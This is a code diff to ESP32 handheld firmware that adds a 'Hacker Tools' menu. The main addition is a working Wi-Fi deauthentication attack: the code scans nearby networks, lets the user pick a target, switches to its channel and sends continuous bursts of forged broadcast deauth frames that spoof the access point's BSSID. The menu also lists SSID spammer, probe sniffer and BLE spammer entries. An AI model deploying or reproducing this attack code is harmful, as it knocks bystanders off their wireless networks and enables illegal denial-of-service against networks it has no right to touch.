@@ -21,6 +21,29 @@
 #include <ESPmDNS.h>
 #include "secrets.h"
 
+// From https://github.com/spacehuhn/esp8266_deauther/blob/master/esp8266_deauther/functions.h
+// extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3);
+extern "C" int wifi_send_pkt_freedom(uint8_t *buf, int len, bool sys_seq);
+extern "C" int esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
+
+
+// ============ DEAUTHER PACKET STRUCTURES ============
+// MAC header
+typedef struct {
+  uint16_t frame_ctrl;
+  uint16_t duration_id;
+  uint8_t addr1[6]; // receiver
+  uint8_t addr2[6]; // sender
+  uint8_t addr3[6]; // BSSID
+  uint16_t seq_ctrl;
+} mac_hdr_t;
+
+// Deauthentication frame
+typedef struct {
+  mac_hdr_t hdr;
+  uint16_t reason_code;
+} deauth_frame_t;
+
 // ============ TFT PINS & CONFIG ============
 #define TFT_CS    10
 #define TFT_DC    9
@@ -89,7 +112,15 @@ enum AppState {
   STATE_VIS_LIFE,
   STATE_VIS_FIRE,
   STATE_ABOUT,
-  STATE_TOOL_WIFI_SONAR
+  STATE_TOOL_WIFI_SONAR,
+  // Hacker Tools
+  STATE_HACKER_TOOLS_MENU,
+  STATE_TOOL_DEAUTH_SELECT,
+  STATE_TOOL_DEAUTH_ATTACK,
+  STATE_TOOL_SPAMMER,
+  STATE_TOOL_PROBE_SNIFFER,
+  STATE_TOOL_BLE_MENU,
+  STATE_DEAUTH_DETECTOR
 };
 
 AppState currentState = STATE_BOOT;
@@ -244,25 +275,14 @@ const unsigned char icon_pet[] PROGMEM = {
 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
 };
 
-const unsigned char icon_sniffer[] PROGMEM = {
-0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x80, 0x00, 0x00, 0x03, 0xC0, 0x00,
-0x00, 0x07, 0xE0, 0x00, 0x00, 0x0F, 0xF0, 0x00, 0x00, 0x1F, 0xF8, 0x00, 0x00, 0x3F, 0xFC, 0x00,
-0x00, 0x7F, 0xFE, 0x00, 0x00, 0x01, 0x80, 0x00, 0x00, 0x01, 0x80, 0x00, 0x03, 0xFF, 0xFF, 0xC0,
-0x07, 0xFF, 0xFF, 0xE0, 0x06, 0x00, 0x00, 0x60, 0x0C, 0x00, 0x00, 0x30, 0x0C, 0x18, 0x18, 0x30,
-0x18, 0x3C, 0x3C, 0x18, 0x18, 0x3C, 0x3C, 0x18, 0x30, 0x18, 0x18, 0x0C, 0x30, 0x00, 0x00, 0x0C,
-0x60, 0x00, 0x00, 0x06, 0xE0, 0x00, 0x00, 0x07, 0xC0, 0xFF, 0xFF, 0x03, 0x80, 0xFF, 0xFF, 0x01,
-0x00, 0x01, 0x80, 0x00, 0x00, 0x01, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
-};
-
-const unsigned char icon_netscan[] PROGMEM = {
-0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0xC0, 0x00, 0x00, 0x07, 0xE0, 0x00, 0x00, 0x0C, 0x30, 0x00,
-0x00, 0x18, 0x18, 0x00, 0x00, 0x30, 0x0C, 0x00, 0x00, 0x60, 0x06, 0x00, 0x00, 0xC3, 0xC3, 0x00,
-0x01, 0x87, 0xE1, 0x80, 0x03, 0x0F, 0xF0, 0xC0, 0x06, 0x1F, 0xF8, 0x60, 0x0C, 0x3F, 0xFC, 0x30,
-0x18, 0x7F, 0xFE, 0x18, 0x30, 0xFF, 0xFF, 0x0C, 0x61, 0xFF, 0xFF, 0x86, 0xC3, 0xF8, 0x1F, 0xC3,
-0xC7, 0xE0, 0x07, 0xE3, 0x8F, 0xC0, 0x03, 0xF1, 0x9F, 0x00, 0x00, 0xF9, 0xBE, 0x00, 0x00, 0x7D,
-0x3C, 0x00, 0x00, 0x3C, 0x78, 0x00, 0x00, 0x1E, 0xF0, 0x00, 0x00, 0x0F, 0xE0, 0x00, 0x00, 0x07,
-0xC0, 0x00, 0x00, 0x03, 0x80, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+const unsigned char icon_hacker[] PROGMEM = {
+0x00, 0x00, 0x00, 0x00, 0x00, 0x7E, 0x7E, 0x00, 0x01, 0xFF, 0xFF, 0x80, 0x03, 0xFF, 0xFF, 0xC0,
+0x07, 0xE0, 0x07, 0xE0, 0x0F, 0x80, 0x01, 0xF0, 0x1F, 0x03, 0xC0, 0xF8, 0x1F, 0x07, 0xE0, 0xF8,
+0x3E, 0x0F, 0xF0, 0x7C, 0x3C, 0x3F, 0xFC, 0x3C, 0x78, 0x7F, 0xFE, 0x1E, 0x78, 0xFF, 0xFF, 0x1E,
+0x78, 0xFF, 0xFF, 0x1E, 0x78, 0x7F, 0xFE, 0x1E, 0x3C, 0x3C, 0x3C, 0x3C, 0x3E, 0x1C, 0x38, 0x7C,
+0x1F, 0x00, 0x00, 0xF8, 0x1F, 0x00, 0x00, 0xF8, 0x0F, 0x80, 0x01, 0xF0, 0x07, 0xC0, 0x03, 0xE0,
+0x03, 0xFF, 0xFF, 0xC0, 0x01, 0xFF, 0xFF, 0x80, 0x00, 0x7E, 0x7E, 0x00, 0x00, 0x00, 0x00, 0x00,
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
 };
 
@@ -310,7 +330,7 @@ const unsigned char icon_sonar[] PROGMEM = {
 0x03, 0x00, 0x00, 0xC0, 0x01, 0xC0, 0x03, 0x80, 0x00, 0x70, 0x0E, 0x00, 0x00, 0x1F, 0xF8, 0x00
 };
 
-const unsigned char* menuIcons[] = {icon_chat, icon_wifi, icon_espnow, icon_courier, icon_system, icon_pet, icon_sniffer, icon_netscan, icon_files, icon_visuals, icon_about, icon_sonar};
+const unsigned char* menuIcons[] = {icon_chat, icon_wifi, icon_espnow, icon_courier, icon_system, icon_pet, icon_hacker, icon_files, icon_visuals, icon_about, icon_sonar};
 
 // ============ AI MODE SELECTION ============
 enum AIMode { MODE_SUBARU, MODE_STANDARD };
@@ -400,6 +420,8 @@ struct WiFiNetwork {
   String ssid;
   int rssi;
   bool encrypted;
+  uint8_t bssid[6];
+  int channel;
 };
 WiFiNetwork networks[20];
 int networkCount = 0;
@@ -476,6 +498,29 @@ VirtualPet myPet = {100.0f, 100.0f, 100.0f, 0, false};
 int petMenuSelection = 0; // 0:Feed, 1:Play, 2:Sleep, 3:Back
 
 // ============ HACKER TOOLS DATA ============
+// Deauther
+uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+String deauthTargetSSID = "";
+uint8_t deauthTargetBSSID[6];
+bool deauthAttackActive = false;
+int deauthPacketsSent = 0;
+
+// Spammer
+bool spammerActive = false;
+
+// Probe Sniffer
+struct ProbeRequest {
+  uint8_t mac[6];
+  String ssid;
+  int rssi;
+  unsigned long lastSeen;
+};
+#define MAX_PROBES 20
+ProbeRequest probes[MAX_PROBES];
+int probeCount = 0;
+bool probeSnifferActive = false;
+
+// Sniffer
 #define SNIFFER_HISTORY_LEN 160
 int snifferHistory[SNIFFER_HISTORY_LEN];
 int snifferHistoryIdx = 0;
@@ -555,10 +600,15 @@ const char* AI_SYSTEM_PROMPT_STANDARD =
   "TONE: Profesional, informatif, dan membantu.";
 
 // ============ FORWARD DECLARATIONS ============
+void drawDeauthSelect();
+void drawDeauthAttack();
+void drawHackerToolsMenu();
+void handleHackerToolsMenuSelect();
+void updateDeauthAttack();
 void changeState(AppState newState);
 void drawStatusBar();
 void showStatus(String message, int delayMs);
-void scanWiFiNetworks();
+void scanWiFiNetworks(bool switchToScanState = true);
 void sendToGemini();
 void triggerNeoPixelEffect(uint32_t color, int duration);
 void updateNeoPixel();
@@ -897,6 +947,171 @@ void drawESPNowChat() {
 }
 
 // ============ VISUAL EFFECTS ============
+void drawDeauthAttack() {
+  canvas.fillScreen(COLOR_BG);
+  drawStatusBar();
+
+  canvas.fillRect(0, 15, SCREEN_WIDTH, 20, 0xF800); // Red header
+  canvas.setTextColor(COLOR_BG);
+  canvas.setTextSize(2);
+  canvas.setCursor(70, 18);
+  canvas.print("DEAUTH ATTACK");
+
+  canvas.setTextColor(COLOR_TEXT);
+  canvas.setTextSize(1);
+  canvas.setCursor(10, 50);
+  canvas.print("Target SSID: ");
+  canvas.setTextColor(0xFFE0); // Yellow
+  canvas.print(deauthTargetSSID);
+
+  canvas.setTextColor(COLOR_TEXT);
+  canvas.setCursor(10, 65);
+  canvas.print("Target BSSID: ");
+  canvas.setTextColor(0xFFE0); // Yellow
+  char bssidStr[18];
+  sprintf(bssidStr, "%02X:%02X:%02X:%02X:%02X:%02X",
+          deauthTargetBSSID[0], deauthTargetBSSID[1], deauthTargetBSSID[2],
+          deauthTargetBSSID[3], deauthTargetBSSID[4], deauthTargetBSSID[5]);
+  canvas.print(bssidStr);
+
+  canvas.drawRect(10, 85, SCREEN_WIDTH - 20, 40, COLOR_BORDER);
+  canvas.setTextColor(COLOR_TEXT);
+  canvas.setTextSize(2);
+  canvas.setCursor(20, 97);
+  canvas.print("Packets Sent: ");
+  canvas.setTextColor(0xF800);
+  canvas.print(deauthPacketsSent);
+
+
+  canvas.setTextColor(COLOR_DIM);
+  canvas.setTextSize(1);
+  canvas.setCursor(10, SCREEN_HEIGHT - 12);
+  canvas.print("ATTACKING... | L+R to Stop");
+
+  tft.drawRGBBitmap(0, 0, canvas.getBuffer(), SCREEN_WIDTH, SCREEN_HEIGHT);
+}
+
+void drawDeauthSelect() {
+  canvas.fillScreen(COLOR_BG);
+  drawStatusBar();
+
+  canvas.fillRect(0, 15, SCREEN_WIDTH, 20, 0xF800); // Red header
+  canvas.setTextColor(COLOR_BG);
+  canvas.setTextSize(2);
+  canvas.setCursor(10, 18);
+  canvas.print("SELECT DEAUTH TARGET");
+
+  if (networkCount == 0) {
+    canvas.setTextColor(COLOR_TEXT);
+    canvas.setTextSize(2);
+    canvas.setCursor(60, 80);
+    canvas.print("No networks found");
+  } else {
+    int itemHeight = 22;
+    int startY = 42;
+    int page = selectedNetwork / 6;
+    int startIdx = page * 6;
+
+    for (int i = startIdx; i < min(networkCount, startIdx + 6); i++) {
+        int y = startY + ((i-startIdx) * itemHeight);
+
+        if (i == selectedNetwork) {
+            canvas.fillRect(5, y, SCREEN_WIDTH - 10, itemHeight - 2, COLOR_PRIMARY);
+            canvas.setTextColor(COLOR_BG);
+        } else {
+            canvas.drawRect(5, y, SCREEN_WIDTH - 10, itemHeight - 2, COLOR_BORDER);
+            canvas.setTextColor(COLOR_TEXT);
+        }
+
+        canvas.setTextSize(1);
+        canvas.setCursor(10, y + 7);
+
+        String displaySSID = networks[i].ssid;
+        if (displaySSID.length() > 22) {
+            displaySSID = displaySSID.substring(0, 22) + "..";
+        }
+        canvas.print(displaySSID);
+
+        if (networks[i].encrypted) {
+          canvas.setCursor(SCREEN_WIDTH - 45, y + 7);
+          if (i != selectedNetwork) canvas.setTextColor(0xF800);
+          canvas.print("L");
+        }
+
+        int bars = map(networks[i].rssi, -100, -50, 1, 4);
+        uint16_t signalColor = (bars > 3) ? 0x07E0 : (bars > 2) ? 0xFFE0 : 0xF800;
+        if (i == selectedNetwork) signalColor = COLOR_BG;
+
+        int barX = SCREEN_WIDTH - 30;
+        for (int b = 0; b < 4; b++) {
+          int h = (b + 1) * 2;
+          if (b < bars) canvas.fillRect(barX + (b * 4), y + 13 - h, 2, h, signalColor);
+          else canvas.drawRect(barX + (b * 4), y + 13 - h, 2, h, COLOR_DIM);
+        }
+    }
+  }
+  canvas.setTextColor(COLOR_DIM);
+  canvas.setTextSize(1);
+  canvas.setCursor(10, SCREEN_HEIGHT - 12);
+  canvas.print("UP/DN=Select | SELECT=Attack | L+R=Back");
+
+  tft.drawRGBBitmap(0, 0, canvas.getBuffer(), SCREEN_WIDTH, SCREEN_HEIGHT);
+}
+
+void updateDeauthAttack() {
+  if (!deauthAttackActive) return;
+
+  // Send deauth packets
+  deauth_frame_t deauth_frame;
+  deauth_frame.hdr.frame_ctrl = 0xc000; // Type: Management, Subtype: Deauthentication
+  deauth_frame.hdr.duration_id = 0;
+  memcpy(deauth_frame.hdr.addr1, broadcast_mac, 6); // Destination: broadcast
+  memcpy(deauth_frame.hdr.addr2, deauthTargetBSSID, 6); // Source: AP BSSID
+  memcpy(deauth_frame.hdr.addr3, deauthTargetBSSID, 6); // BSSID: AP BSSID
+  deauth_frame.hdr.seq_ctrl = 0;
+  deauth_frame.reason_code = 1; // Unspecified reason
+
+  // Channel is already set, just send the packet
+  for (int i=0; i<20; i++) { // Send a burst of packets
+    esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame_t), false);
+    deauthPacketsSent++;
+  }
+  delay(1);
+}
+
+void drawHackerToolsMenu() {
+  canvas.fillScreen(COLOR_BG);
+  drawStatusBar();
+
+  canvas.fillRect(0, 15, SCREEN_WIDTH, 25, 0xF800); // Red Header
+  canvas.setTextColor(COLOR_BG);
+  canvas.setTextSize(2);
+  canvas.setCursor(80, 20);
+  canvas.print("HACKER TOOLS");
+
+  const char* items[] = {"WiFi Deauther", "SSID Spammer", "Probe Sniffer", "Packet Monitor", "BLE Spammer", "Deauth Detector", "Back"};
+  int itemHeight = 19;
+  int startY = 48;
+
+  for (int i = 0; i < 7; i++) {
+    int y = startY + (i * itemHeight);
+
+    if (i == menuSelection) { // Reusing menuSelection var
+      canvas.fillRect(10, y, SCREEN_WIDTH - 20, itemHeight - 2, COLOR_PRIMARY);
+      canvas.setTextColor(COLOR_BG);
+    } else {
+      canvas.drawRect(10, y, SCREEN_WIDTH - 20, itemHeight - 2, COLOR_BORDER);
+      canvas.setTextColor(COLOR_PRIMARY);
+    }
+
+    canvas.setTextSize(2);
+    canvas.setCursor(20, y + 3);
+    canvas.print(items[i]);
+  }
+
+  tft.drawRGBBitmap(0, 0, canvas.getBuffer(), SCREEN_WIDTH, SCREEN_HEIGHT);
+}
+
 void drawVisualsMenu() {
   canvas.fillScreen(COLOR_BG);
   drawStatusBar();
@@ -2334,8 +2549,8 @@ void showMainMenu(int x_offset) {
 
   drawStatusBar();
   
-  const char* items[] = {"AI CHAT", "WIFI MGR", "ESP-NOW", "COURIER", "SYSTEM", "V-PET", "SNIFFER", "NET SCAN", "FILES", "VISUALS", "ABOUT", "SONAR"};
-  int numItems = 12;
+  const char* items[] = {"AI CHAT", "WIFI MGR", "ESP-NOW", "COURIER", "SYSTEM", "V-PET", "HACKER", "FILES", "VISUALS", "ABOUT", "SONAR"};
+  int numItems = 11;
   
   int centerX = SCREEN_WIDTH / 2;
   int centerY = SCREEN_HEIGHT / 2 + 5;
@@ -2917,19 +3132,21 @@ void checkResiReal() {
 }
 
 // ============ WIFI FUNCTIONS ============
-void scanWiFiNetworks() {
+void scanWiFiNetworks(bool switchToScanState) {
   showProgressBar("Scanning", 0);
   WiFi.mode(WIFI_STA);
   WiFi.disconnect();
   delay(100);
   showProgressBar("Scanning", 30);
-  int n = WiFi.scanNetworks();
+  int n = WiFi.scanNetworks(false, false, false, 300);
   networkCount = min(n, 20);
   showProgressBar("Processing", 60);
   for (int i = 0; i < networkCount; i++) {
     networks[i].ssid = WiFi.SSID(i);
     networks[i].rssi = WiFi.RSSI(i);
     networks[i].encrypted = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
+    memcpy(networks[i].bssid, WiFi.BSSID(i), 6);
+    networks[i].channel = WiFi.channel(i);
   }
   for (int i = 0; i < networkCount - 1; i++) {
     for (int j = i + 1; j < networkCount; j++) {
@@ -2945,7 +3162,9 @@ void scanWiFiNetworks() {
   selectedNetwork = 0;
   wifiPage = 0;
   menuSelection = 0;
-  changeState(STATE_WIFI_SCAN);
+  if (switchToScanState) {
+    changeState(STATE_WIFI_SCAN);
+  }
 }
 
 void connectToWiFi(String ssid, String password) {
@@ -3119,7 +3338,7 @@ void changeState(AppState newState) {
 // ============ MENU HANDLERS ============
 void handleMainMenuSelect() {
   switch(menuSelection) {
-    case 0:
+    case 0: // AI CHAT
       if (WiFi.status() == WL_CONNECTED) {
         isSelectingMode = true;
         showAIModeSelection(0);
@@ -3128,11 +3347,11 @@ void handleMainMenuSelect() {
         showStatus("WiFi not connected!", 1500);
       }
       break;
-    case 1:
+    case 1: // WIFI MGR
       menuSelection = 0;
       changeState(STATE_WIFI_MENU);
       break;
-    case 2:
+    case 2: // ESP-NOW
       menuSelection = 0;
       if (!espnowInitialized) {
         if (initESPNow()) {
@@ -3144,41 +3363,68 @@ void handleMainMenuSelect() {
       }
       changeState(STATE_ESPNOW_MENU);
       break;
-    case 3:
+    case 3: // COURIER
       changeState(STATE_TOOL_COURIER);
       break;
-    case 4:
+    case 4: // SYSTEM
       changeState(STATE_SYSTEM_PERF);
       break;
-    case 5:
+    case 5: // V-PET
       loadPetData();
       changeState(STATE_VPET);
       break;
-    case 6:
-      changeState(STATE_TOOL_SNIFFER);
+    case 6: // HACKER
+      menuSelection = 0;
+      changeState(STATE_HACKER_TOOLS_MENU);
       break;
-    case 7:
-      scanWiFiNetworks(); // Trigger initial scan
-      changeState(STATE_TOOL_NETSCAN);
-      break;
-    case 8:
+    case 7: // FILES
       fileListCount = 0; // Force refresh
       changeState(STATE_TOOL_FILE_MANAGER);
       break;
-    case 9: // Visuals
-      menuSelection = 0; // Reuse selection for sub-menu
+    case 8: // VISUALS
+      menuSelection = 0;
       changeState(STATE_VISUALS_MENU);
       break;
-    case 10:
+    case 9: // ABOUT
       changeState(STATE_ABOUT);
       break;
-    case 11:
+    case 10: // SONAR
       if (WiFi.status() != WL_CONNECTED) {
          showStatus("Connect WiFi\nFirst!", 1000);
          changeState(STATE_WIFI_MENU);
       } else {
          changeState(STATE_TOOL_WIFI_SONAR);
       }
+      break;
+  }
+}
+
+void handleHackerToolsMenuSelect() {
+  switch(menuSelection) {
+    case 0: // Deauther
+      networkCount = 0;
+      selectedNetwork = 0;
+      scanWiFiNetworks(false);
+      changeState(STATE_TOOL_DEAUTH_SELECT);
+      break;
+    case 1: // Spammer
+      changeState(STATE_TOOL_SPAMMER);
+      break;
+    case 2: // Probe Sniffer
+      changeState(STATE_TOOL_PROBE_SNIFFER);
+      break;
+    case 3: // Packet Monitor
+      changeState(STATE_TOOL_SNIFFER);
+      break;
+    case 4: // BLE Spammer
+      changeState(STATE_TOOL_BLE_MENU);
+      break;
+    case 5: // Deauth Detector
+      changeState(STATE_DEAUTH_DETECTOR);
+      break;
+    case 6: // Back
+      menuSelection = 0;
+      changeState(STATE_MAIN_MENU);
       break;
   }
 }
@@ -3433,6 +3679,15 @@ void refreshCurrentScreen() {
     case STATE_VISUALS_MENU:
       drawVisualsMenu();
       break;
+    case STATE_HACKER_TOOLS_MENU:
+      drawHackerToolsMenu();
+      break;
+    case STATE_TOOL_DEAUTH_SELECT:
+      drawDeauthSelect();
+      break;
+    case STATE_TOOL_DEAUTH_ATTACK:
+      drawDeauthAttack();
+      break;
     case STATE_VIS_STARFIELD:
       drawStarfield();
       break;
@@ -3682,6 +3937,11 @@ void loop() {
     refreshCurrentScreen();
   }
   
+  // Attack loop needs to run outside of throttled UI updates
+  if (currentState == STATE_TOOL_DEAUTH_ATTACK) {
+    updateDeauthAttack();
+  }
+
   if (transitionState == TRANSITION_NONE && currentMillis - lastDebounce > debounceDelay) {
     bool buttonPressed = false;
     
@@ -3771,7 +4031,13 @@ void loop() {
     if (digitalRead(BTN_DOWN) == BTN_ACT) {
       switch(currentState) {
         case STATE_MAIN_MENU:
-          if (menuSelection < 11) menuSelection++;
+          if (menuSelection < 10) menuSelection++;
+          break;
+        case STATE_HACKER_TOOLS_MENU:
+          if (menuSelection < 6) menuSelection++;
+          break;
+        case STATE_TOOL_DEAUTH_SELECT:
+          if (selectedNetwork < networkCount - 1) selectedNetwork++;
           break;
         case STATE_WIFI_MENU:
           if (menuSelection < 2) menuSelection++;
@@ -3851,7 +4117,7 @@ void loop() {
     if (digitalRead(BTN_RIGHT) == BTN_ACT) {
       switch(currentState) {
         case STATE_MAIN_MENU:
-          if (menuSelection < 11) menuSelection++;
+          if (menuSelection < 10) menuSelection++;
           break;
         case STATE_KEYBOARD:
         case STATE_PASSWORD_INPUT:
@@ -3877,6 +4143,26 @@ void loop() {
       switch(currentState) {
         case STATE_MAIN_MENU:
           handleMainMenuSelect();
+          break;
+        case STATE_HACKER_TOOLS_MENU:
+          handleHackerToolsMenuSelect();
+          break;
+        case STATE_TOOL_DEAUTH_SELECT:
+          if (networkCount > 0) {
+            deauthTargetSSID = networks[selectedNetwork].ssid;
+            memcpy(deauthTargetBSSID, networks[selectedNetwork].bssid, 6);
+            int channel = networks[selectedNetwork].channel;
+
+            showStatus("Preparing...", 500);
+            WiFi.disconnect();
+            WiFi.mode(WIFI_AP_STA);
+            esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+            showStatus("Attacking on Ch: " + String(channel), 1000);
+
+            deauthPacketsSent = 0;
+            deauthAttackActive = true;
+            changeState(STATE_TOOL_DEAUTH_ATTACK);
+          }
           break;
         case STATE_VISUALS_MENU:
           handleVisualsMenuSelect();
@@ -3975,6 +4261,16 @@ void loop() {
     
     if (digitalRead(BTN_LEFT) == BTN_ACT && digitalRead(BTN_RIGHT) == BTN_ACT) {
       switch(currentState) {
+        case STATE_TOOL_DEAUTH_ATTACK:
+          deauthAttackActive = false;
+          // Restore normal wifi state
+          WiFi.disconnect();
+          WiFi.mode(WIFI_STA);
+          changeState(STATE_HACKER_TOOLS_MENU);
+          break;
+        case STATE_TOOL_DEAUTH_SELECT:
+          changeState(STATE_HACKER_TOOLS_MENU);
+          break;
         case STATE_PASSWORD_INPUT:
           changeState(STATE_WIFI_SCAN);
           break;
@@ -3984,6 +4280,7 @@ void loop() {
         case STATE_WIFI_MENU:
         case STATE_SYSTEM_PERF:
         case STATE_TOOL_COURIER:
+        case STATE_HACKER_TOOLS_MENU:
         case STATE_TOOL_SNIFFER:
         case STATE_TOOL_NETSCAN:
         case STATE_TOOL_FILE_MANAGER:
